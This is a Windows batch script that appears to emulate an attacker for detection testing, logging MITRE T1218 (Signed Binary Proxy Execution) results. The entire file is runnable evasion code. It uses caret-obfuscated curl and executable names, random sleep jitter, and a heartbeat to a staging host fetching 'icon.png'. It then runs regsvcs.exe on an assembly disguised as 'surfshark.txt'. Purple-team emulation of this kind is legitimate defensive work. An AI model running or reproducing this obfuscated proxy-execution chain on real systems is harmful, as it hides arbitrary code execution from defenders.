@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8110\f73bbcf8
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8110-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=surfshark.txt
SET dvhhyc=8110

REM Log file path using PHR_ variable
SET wqehksp=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial random delay (30-60s)
SET /A rndmzdly=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay=!rndmzdly!s>> "!wqehksp!" 2>nul
timeout /t !rndmzdly! /nobreak >nul

REM Check server availability (Step 1)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check=start>> "!wqehksp!" 2>nul
SET c^u^r^l_^c^m^d=c^u^r^l
!c^u^r^l_^c^m^d! -k -s -o nul "!keghkgto!"
IF !ERRORLEVEL! EQU 0 (
    SET hb_result=1
    SET hb_error=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check=success>> "!wqehksp!" 2>nul
) ELSE (
    SET hb_result=0
    SET hb_error=connection_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check=failed>> "!wqehksp!" 2>nul
)

REM TTP logging for T1218
SET TTP_ID=T1218
SET TTP_NAME=SignedBinaryProxyExecution
SET /A tpresult=%hb_result%
SET tperr=%hb_error%
FOR /F "tokens=1-4 delims=/ " %%a IN ("!DATE!") DO SET fdate=%%c-%%a-%%b
SET ftime=!TIME:.=!
echo [!fdate! !ftime:~0,8!.!ftime:~9,3!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!TTP_ID!|!TTP_NAME!=!tpresult!:!tperr!>> "!wqehksp!" 2>nul

REM Delay before next operation
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay=10s>> "!wqehksp!" 2>nul
ping -n 11 127.0.0.1 >nul

REM Change directory (Step 3)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir=!txisnba!>> "!wqehksp!" 2>nul
cd /d "!txisnba!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir=failed>> "!wqehksp!" 2>nul
    ENDLOCAL
    exit /b 1
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir=success>> "!wqehksp!" 2>nul

REM Random delay (5-15s)
SET /A mddly=%RANDOM% %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay=!mddly!s>> "!wqehksp!" 2>nul
CHOICE /C Y /N /D Y /T !mddly! >nul

REM Obfuscated regsvcs.exe execution (Step 4)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_execution=start>> "!wqehksp!" 2>nul

SET p^a^r^t^1=r^e
SET p^a^r^t^2=g^s
SET p^a^r^t^3=v^c
SET p^a^r^t^4=s^.^e
SET p^a^r^t^5=x^e
SET l^o^l^b^i^n=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\!p^a^r^t^1!!p^a^r^t^2!!p^a^r^t^3!!p^a^r^t^4!!p^a^r^t^5!

REM Execute with escaped command
CALL "!l^o^l^b^i^n!" "!xzanpex!"
SET exec_result=!ERRORLEVEL!

IF !exec_result! EQU 0 (
    SET exec_success=1
    SET exec_err=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_execution=success>> "!wqehksp!" 2>nul
) ELSE (
    SET exec_success=0
    SET exec_err=assembly_load_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_execution=failed>> "!wqehksp!" 2>nul
)

REM TTP logging for regsvcs execution
SET /A tpresult2=!exec_success!
SET tperr2=!exec_err!
FOR /F "tokens=1-4 delims=/ " %%a IN ("!DATE!") DO SET fdate2=%%c-%%a-%%b
SET ftime2=!TIME:.=!
echo [!fdate2! !ftime2:~0,8!.!ftime2:~9,3!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!TTP_ID!|!TTP_NAME!=!tpresult2!:!tperr2!>> "!wqehksp!" 2>nul

REM Final random delay
SET /A fndly=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay=!fndly!s>> "!wqehksp!" 2>nul
timeout /t !fndly! /nobreak >nul

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete=cleanup>> "!wqehksp!" 2>nul
ENDLOCAL